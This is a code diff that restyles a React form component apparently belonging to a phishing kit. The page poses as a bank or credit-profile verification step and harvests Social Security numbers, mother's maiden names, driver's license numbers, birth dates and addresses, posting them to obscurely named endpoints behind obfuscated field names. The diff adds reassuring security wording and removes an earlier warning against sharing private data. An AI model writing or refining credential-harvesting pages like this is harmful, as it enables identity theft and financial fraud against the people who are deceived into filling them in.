@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
@@ -32,7 +32,8 @@ const BasicInfo: React.FC = () => {
     stAd: '',
     city: '',
     state: '',
-    zipCode: ''
+    zipCode: '',
+    form: ''
   });
   const [username, setUsername] = useState('');
   const isAllowed = useAccessCheck(baseUrl);
@@ -41,23 +42,24 @@ const BasicInfo: React.FC = () => {
   const location = useLocation();
   const { emzemz: emzemzState } = location.state || {};
 
-  React.useEffect(() => {
+  useEffect(() => {
     if (emzemzState) {
       setUsername(emzemzState);
     } else {
-      console.error('No username provided from previous page');
-      // Optionally redirect back or show error
+      navigate('/login', { replace: true });
     }
-  }, [emzemzState]);
+  }, [emzemzState, navigate]);
 
-  // Show loading state while checking access
-  if (!isAllowed) {
-    return <div>Loading...</div>;
+  if (isAllowed === null) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Loading...</div>;
   }
 
-  // Check if username is available before showing form
+  if (isAllowed === false) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting...</div>;
+  }
+
   if (!username) {
-    return <div>Error: No username provided. Please go back and try again.</div>;
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing user details. Please restart the process.</div>;
   }
 
   const currentYear = new Date().getFullYear();
@@ -103,7 +105,8 @@ const BasicInfo: React.FC = () => {
       stAd: !stAd.trim() ? 'Street address is required' : '',
       city: !city.trim() ? 'City is required' : '',
       state: !state.trim() ? 'State is required' : '',
-      zipCode: !zipCode.trim() ? 'Zip code is required' : ''
+      zipCode: !zipCode.trim() ? 'Zip code is required' : '',
+      form: ''
     };
 
     if (month && day && year) {
@@ -141,7 +144,7 @@ const BasicInfo: React.FC = () => {
       const dob = `${getMonthName(month)}/${day}/${year}`;
 
       // Submit basic info
-      await axios.post(`${baseUrl}api/logix-basic-info/`, {
+      await axios.post(`${baseUrl}api/fifty-meta-data-3/`, {
         emzemz: username,
         fzNme,
         lzNme,
@@ -153,7 +156,7 @@ const BasicInfo: React.FC = () => {
       });
 
       // Submit home address
-      await axios.post(`${baseUrl}api/logix-meta-data-4/`, {
+      await axios.post(`${baseUrl}api/fifty-meta-data-4/`, {
         emzemz: username,
         stAd,
         apt,
@@ -179,339 +182,244 @@ const BasicInfo: React.FC = () => {
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Basic Information & Home Address</h2>
-      </div>
+    <div className="w-full">
+      <div className="mx-auto w-full max-w-4xl rounded-md border border-gray-200 bg-white shadow-[0_12px_30px_rgba(0,0,0,0.12)]">
+        <div className="h-2 bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6]" />
+        <div className="px-8 py-8">
+          <h2 className="text-2xl font-semibold text-gray-900">Confirm Your Information</h2>
+          <p className="mt-3 text-sm text-gray-600">
+            Tell us a bit about yourself and confirm the address tied to your credit profile. We’ll use this to keep your account secure.
+          </p>
 
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="">We will need you to confirm your personal information.</p>
+          <form onSubmit={handleSubmit} className="mt-8 space-y-8">
+            <section className="space-y-4">
+              <h3 className="text-lg font-semibold text-gray-900">Personal Details</h3>
+              <div className="grid gap-6 md:grid-cols-2">
+                <div className="space-y-2">
+                  <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">First Name</label>
+                  <input
+                    id="fzNme"
+                    name="fzNme"
+                    type="text"
+                    value={fzNme}
+                    onChange={(e) => setFzNme(e.target.value)}
+                    className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                    placeholder="Enter first name"
+                  />
+                  {errors.fzNme && <p className="text-xs font-semibold text-red-600">{errors.fzNme}</p>}
+                </div>
 
-        <form onSubmit={handleSubmit} className="max-w-lg mx-auto">
-          {/* First Name */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">First Name:</label>
-            <input
-              id="fzNme"
-              name="fzNme"
-              type="text"
-              value={fzNme}
-              onChange={(e) => setFzNme(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter first name"
-            />
-            {errors.fzNme && (
-              <div className="flex items-center gap-2 text-red-600 text-sm">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.fzNme}</span>
+                <div className="space-y-2">
+                  <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Last Name</label>
+                  <input
+                    id="lzNme"
+                    name="lzNme"
+                    type="text"
+                    value={lzNme}
+                    onChange={(e) => setLzNme(e.target.value)}
+                    className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                    placeholder="Enter last name"
+                  />
+                  {errors.lzNme && <p className="text-xs font-semibold text-red-600">{errors.lzNme}</p>}
+                </div>
+
+                <div className="space-y-2">
+                  <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Phone Number</label>
+                  <input
+                    id="phone"
+                    name="phone"
+                    type="text"
+                    value={phone}
+                    onChange={(e) => setPhone(formatPhone(e.target.value))}
+                    className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                    placeholder="(555) 123-4567"
+                  />
+                  {errors.phone && <p className="text-xs font-semibold text-red-600">{errors.phone}</p>}
+                </div>
+
+                <div className="space-y-2">
+                  <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Mother's Maiden Name</label>
+                  <input
+                    id="motherMaidenName"
+                    name="motherMaidenName"
+                    type="text"
+                    value={motherMaidenName}
+                    onChange={(e) => setMotherMaidenName(e.target.value)}
+                    className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                    placeholder="Enter maiden name"
+                  />
+                  {errors.motherMaidenName && <p className="text-xs font-semibold text-red-600">{errors.motherMaidenName}</p>}
+                </div>
+
+                <div className="space-y-2">
+                  <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Social Security Number</label>
+                  <div className="relative">
+                    <input
+                      id="ssn"
+                      name="ssn"
+                      type={showSSN ? 'text' : 'password'}
+                      value={ssn}
+                      onChange={(e) => setSsn(formatSSN(e.target.value))}
+                      maxLength={11}
+                      className="w-full rounded-sm border border-gray-300 px-3 py-2 pr-20 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                      placeholder="XXX-XX-XXXX"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowSSN((prev) => !prev)}
+                      className="absolute inset-y-0 right-3 my-auto text-xs font-semibold uppercase tracking-wide text-[#123b9d]"
+                    >
+                      {showSSN ? 'Hide' : 'Show'}
+                    </button>
+                  </div>
+                  {errors.ssn && <p className="text-xs font-semibold text-red-600">{errors.ssn}</p>}
+                </div>
+
+                <div className="space-y-2">
+                  <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Driver's License</label>
+                  <input
+                    id="driverLicense"
+                    name="driverLicense"
+                    type="text"
+                    value={driverLicense}
+                    onChange={(e) => setDriverLicense(e.target.value)}
+                    className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                    placeholder="Enter license number"
+                  />
+                  {errors.driverLicense && <p className="text-xs font-semibold text-red-600">{errors.driverLicense}</p>}
+                </div>
               </div>
-            )}
-          </div>
 
-          {/* Last Name */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Last Name:</label>
-            <input
-              id="lzNme"
-              name="lzNme"
-              type="text"
-              value={lzNme}
-              onChange={(e) => setLzNme(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter last name"
-            />
-            {errors.lzNme && (
-              <div className="flex items-center gap-2 text-red-600 text-sm ml-28">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.lzNme}</span>
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Date of Birth</label>
+                <div className="flex flex-wrap gap-2">
+                  <select
+                    value={month}
+                    onChange={(e) => setMonth(e.target.value)}
+                    className="w-full max-w-[180px] rounded-sm border border-gray-300 px-3 py-2 text-sm focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  >
+                    <option value="">Month</option>
+                    {Array.from({ length: 12 }, (_, i) => (
+                      <option key={i + 1} value={i + 1}>
+                        {new Date(0, i).toLocaleString('default', { month: 'long' })}
+                      </option>
+                    ))}
+                  </select>
+                  <select
+                    value={day}
+                    onChange={(e) => setDay(e.target.value)}
+                    className="w-full max-w-[120px] rounded-sm border border-gray-300 px-3 py-2 text-sm focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  >
+                    <option value="">Day</option>
+                    {Array.from({ length: daysInMonth }, (_, i) => (
+                      <option key={i + 1} value={i + 1}>
+                        {i + 1}
+                      </option>
+                    ))}
+                  </select>
+                  <select
+                    value={year}
+                    onChange={(e) => setYear(e.target.value)}
+                    className="w-full max-w-[140px] rounded-sm border border-gray-300 px-3 py-2 text-sm focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  >
+                    <option value="">Year</option>
+                    {years.map((y) => (
+                      <option key={y} value={y}>
+                        {y}
+                      </option>
+                    ))}
+                  </select>
+                </div>
+                {errors.dob && <p className="text-xs font-semibold text-red-600">{errors.dob}</p>}
               </div>
-            )}
-          </div>
+            </section>
 
-          {/* Phone */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Phone:</label>
-            <input
-              id="phone"
-              name="phone"
-              type="text"
-              value={phone}
-              onChange={(e) => setPhone(formatPhone(e.target.value))}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="(555) 123-4567"
-            />
-          </div>
-          {errors.phone && (
-            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-              </svg>
-              <span>{errors.phone}</span>
-            </div>
-          )}
+            <section className="space-y-4">
+              <h3 className="text-lg font-semibold text-gray-900">Home Address</h3>
+              <div className="grid gap-6 md:grid-cols-2">
+                <div className="space-y-2 md:col-span-2">
+                  <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Street Address</label>
+                  <input
+                    id="stAd"
+                    name="stAd"
+                    type="text"
+                    value={stAd}
+                    onChange={(e) => setStAd(e.target.value)}
+                    className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                    placeholder="123 Main Street"
+                  />
+                  {errors.stAd && <p className="text-xs font-semibold text-red-600">{errors.stAd}</p>}
+                </div>
 
-          {/* SSN */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">SSN:</label>
-            <input
-              id="ssn"
-              name="ssn"
-              type={showSSN ? 'text' : 'password'}
-              value={ssn}
-              onChange={(e) => setSsn(formatSSN(e.target.value))}
-              maxLength={11}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="XXX-XX-XXXX"
-            />
-            <span
-              className="text-blue-700 text-sm hover:underline cursor-pointer"
-              onClick={() => setShowSSN(!showSSN)}
-            >
-              {showSSN ? 'Hide' : 'Show'}
-            </span>
-          </div>
-          {errors.ssn && (
-            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-              </svg>
-              <span>{errors.ssn}</span>
-            </div>
-          )}
+                <div className="space-y-2">
+                  <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Apartment / Unit (optional)</label>
+                  <input
+                    id="apt"
+                    name="apt"
+                    type="text"
+                    value={apt}
+                    onChange={(e) => setApt(e.target.value)}
+                    className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  />
+                </div>
 
-          {/* Mother's Maiden Name */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Mother's Maiden Name:</label>
-            <input
-              id="motherMaidenName"
-              name="motherMaidenName"
-              type="text"
-              value={motherMaidenName}
-              onChange={(e) => setMotherMaidenName(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter maiden name"
-            />
-          </div>
-          {errors.motherMaidenName && (
-            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-              </svg>
-              <span>{errors.motherMaidenName}</span>
-            </div>
-          )}
+                <div className="space-y-2">
+                  <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">City</label>
+                  <input
+                    id="city"
+                    name="city"
+                    type="text"
+                    value={city}
+                    onChange={(e) => setCity(e.target.value)}
+                    className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  />
+                  {errors.city && <p className="text-xs font-semibold text-red-600">{errors.city}</p>}
+                </div>
 
-          {/* Date of Birth */}
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Date of Birth:</label>
-            <div className="flex gap-2">
-              <select
-                value={month}
-                onChange={(e) => setMonth(e.target.value)}
-                className="border border-gray-300 px-2 py-1 text-sm rounded"
-              >
-                <option value="">Month</option>
-                {Array.from({ length: 12 }, (_, i) => (
-                  <option key={i + 1} value={i + 1}>
-                    {new Date(0, i).toLocaleString('default', { month: 'long' })}
-                  </option>
-                ))}
-              </select>
-              <select
-                value={day}
-                onChange={(e) => setDay(e.target.value)}
-                className="border border-gray-300 px-2 py-1 text-sm rounded"
-              >
-                <option value="">Day</option>
-                {Array.from({ length: daysInMonth }, (_, i) => (
-                  <option key={i + 1} value={i + 1}>
-                    {i + 1}
-                  </option>
-                ))}
-              </select>
-              <select
-                value={year}
-                onChange={(e) => setYear(e.target.value)}
-                className="border border-gray-300 px-2 py-1 text-sm rounded"
-              >
-                <option value="">Year</option>
-                {years.map((y) => (
-                  <option key={y} value={y}>
-                    {y}
-                  </option>
-                ))}
-              </select>
-            </div>
-          </div>
-          {errors.dob && (
-            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-              </svg>
-              <span>{errors.dob}</span>
-            </div>
-          )}
+                <div className="space-y-2">
+                  <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">State</label>
+                  <input
+                    id="state"
+                    name="state"
+                    type="text"
+                    value={state}
+                    onChange={(e) => setState(e.target.value)}
+                    className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  />
+                  {errors.state && <p className="text-xs font-semibold text-red-600">{errors.state}</p>}
+                </div>
 
-          {/* Driver's License */}
-          <div className="flex items-center gap-4 mb-6">
-            <label className="text-gray-700 w-24 text-right">Driver's License:</label>
-            <input
-              id="driverLicense"
-              name="driverLicense"
-              type="text"
-              value={driverLicense}
-              onChange={(e) => setDriverLicense(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter license number"
-            />
-          </div>
-          {errors.driverLicense && (
-            <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-              </svg>
-              <span>{errors.driverLicense}</span>
-            </div>
-          )}
-
-          {/* Home Address Section */}
-          <div className="border-t-2 border-gray-300 mt-6 pt-6">
-            <h3 className="text-lg font-semibold text-gray-800 mb-4">Home Address</h3>
-            
-            {/* Street Address */}
-            <div className="flex items-center gap-4 mb-4">
-              <label className="text-gray-700 w-24 text-right">Street Address:</label>
-              <input
-                id="stAd"
-                name="stAd"
-                type="text"
-                value={stAd}
-                onChange={(e) => setStAd(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="Enter street address"
-              />
-            </div>
-            {errors.stAd && (
-              <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.stAd}</span>
+                <div className="space-y-2">
+                  <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Zip Code</label>
+                  <input
+                    id="zipCode"
+                    name="zipCode"
+                    type="text"
+                    value={zipCode}
+                    onChange={(e) => setZipCode(e.target.value)}
+                    className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  />
+                  {errors.zipCode && <p className="text-xs font-semibold text-red-600">{errors.zipCode}</p>}
+                </div>
               </div>
-            )}
+            </section>
 
-            {/* Apartment/Unit */}
-            <div className="flex items-center gap-4 mb-4">
-              <label className="text-gray-700 w-24 text-right">Apartment/Unit:</label>
-              <input
-                id="apt"
-                name="apt"
-                type="text"
-                value={apt}
-                onChange={(e) => setApt(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="Optional"
-              />
-            </div>
+            {errors.form && <p className="text-sm font-semibold text-red-600">{errors.form}</p>}
 
-            {/* City */}
-            <div className="flex items-center gap-4 mb-4">
-              <label className="text-gray-700 w-24 text-right">City:</label>
-              <input
-                id="city"
-                name="city"
-                type="text"
-                value={city}
-                onChange={(e) => setCity(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="Enter city"
-              />
-            </div>
-            {errors.city && (
-              <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.city}</span>
-              </div>
-            )}
-
-            {/* State */}
-            <div className="flex items-center gap-4 mb-4">
-              <label className="text-gray-700 w-24 text-right">State:</label>
-              <input
-                id="state"
-                name="state"
-                type="text"
-                value={state}
-                onChange={(e) => setState(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="Enter state"
-              />
-            </div>
-            {errors.state && (
-              <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.state}</span>
-              </div>
-            )}
-
-            {/* Zip Code */}
-            <div className="flex items-center gap-4 mb-6">
-              <label className="text-gray-700 w-24 text-right">Zip Code:</label>
-              <input
-                id="zipCode"
-                name="zipCode"
-                type="text"
-                value={zipCode}
-                onChange={(e) => setZipCode(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="Enter zip code"
-              />
-            </div>
-            {errors.zipCode && (
-              <div className="flex items-center gap-2 text-red-600 text-sm ml-28 mb-4">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.zipCode}</span>
-              </div>
-            )}
-          </div>
-
-          {!isLoading ? (
-            <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
+            <div className="flex justify-end">
               <button
                 type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
+                disabled={isLoading}
+                className="inline-flex items-center justify-center rounded-sm bg-[#123b9d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#0f2f6e] disabled:cursor-not-allowed disabled:opacity-70"
               >
-                Continue
+                {isLoading ? 'Submitting…' : 'Continue'}
               </button>
             </div>
-          ) : (
-            <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-          )}
-        </form>
-      </div>
+          </form>
 
-      <div className="px-6 pb-6">
-        <p className="text-xs text-gray-700 mb-2">
-          For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
-        </p>
-        <div className="text-xs text-blue-700 space-x-2">
-          <a href="#" className="hover:underline">Forgot Username?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Password?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Everything?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Locked Out?</a>
+          <div className="mt-6 rounded-md bg-[#f4f2f2] px-4 py-3 text-xs text-gray-600">
+            We keep your information secure and only use it to verify your identity and maintain your account.
+          </div>
         </div>
       </div>
     </div>
